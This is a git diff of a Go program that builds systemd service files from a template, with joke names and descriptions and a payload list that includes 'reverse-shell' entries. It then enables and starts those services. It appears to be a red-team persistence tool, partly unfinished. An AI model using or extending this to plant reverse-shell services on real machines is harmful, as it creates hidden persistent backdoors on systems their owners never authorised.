@@ -1,10 +1,15 @@
 //Michael Burke, mdb5315@rit.edu
 package main
 
+//TODO: ensure there is at least one of each payload
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
 	"math/rand"
+	"os"
+	"os/exec"
+	"strings"
 	"time"
 )
 
@@ -15,6 +20,11 @@ type service struct {
 	filename    string
 	payload     string
 	user        string
+}
+
+type servicefile struct {
+	contents string
+	details  service
 }
 
 func (this service) String() string {
@@ -32,14 +42,69 @@ var names, descriptions, paths, filenames, payloads []string
 
 func main() {
 	buildDB()
-	dat, _ := ioutil.ReadFile("template.service")
-	file := string(dat)
-	fmt.Println(file)
-	services := buildServices(len(names))
+	// services := buildServices(len(names))
+	services := buildServices(2)
 	for i := 0; i < len(services); i++ {
 		fmt.Println(services[i].String())
 		fmt.Println()
 	}
+	servicefiles := buildFiles(services)
+	createServices(servicefiles)
+
+}
+
+func createServices(files []servicefile) {
+	for i := 0; i < len(files); i++ {
+		curService := files[i]
+		//Create the .service file
+		createFile( /*"/etc/systemd/system/"+*/ curService.details.name+".service", curService.contents)
+		//Place the playload in the correct location
+		//copyFile(curService.details.payload, curService.details.path+curService.details.filename)
+		enableService := exec.Command("systemctl enable " + curService.details.name + ".service")
+		enableService.Run()
+		runService := exec.Command("systemctl start " + curService.details.name + ".service")
+		runService.Run()
+	}
+}
+
+func copyFile(src, dst string) error {
+	in, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer in.Close()
+
+	out, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	if err != nil {
+		return err
+	}
+	return out.Close()
+}
+
+func createFile(path, contents string) {
+	ioutil.WriteFile(path, []byte(contents), 0644)
+}
+
+func buildFiles(services []service) []servicefile {
+	var servicefiles []servicefile
+	dat, _ := ioutil.ReadFile("template.service")
+	template := string(dat)
+	for i := 0; i < len(services); i++ {
+		service := services[i]
+		contents := template
+		contents = strings.Replace(contents, "{description}", service.description, 1)
+		contents = strings.Replace(contents, "{user}", service.user, 1)
+		contents = strings.Replace(contents, "{exec}", service.path+service.filename, 1)
+		newServiceFile := servicefile{contents, service}
+		servicefiles = append(servicefiles, newServiceFile)
+	}
+	return servicefiles
 }
 
 func buildDB() {
@@ -57,8 +122,8 @@ func buildDB() {
 		"hehehehehehehehehehehe",
 		"UwU what's this?",
 		"Vanessa, I'm a material gorl!",
-		"I turned myself into a service morty! I'm service Rick!",
-		"If you or a love one has been diagnosed with mesothelioma, you may be entitled to a cash reward",
+		"I turned myself into a service Morty! I'm service Rick!",
+		"If you or a loved one has been diagnosed with mesothelioma, you may be entitled to a cash reward",
 		"It's free real estate",
 		"Hot singles in your area",
 		"Meesa jar jar binks",
@@ -102,6 +167,8 @@ func buildDB() {
 		"reverse-shell",
 		"reverse-shell",
 		"reverse-shell",
+		"sleep",
+		"sleep",
 		"sleep",
 		"sleep",
 		"sleep",
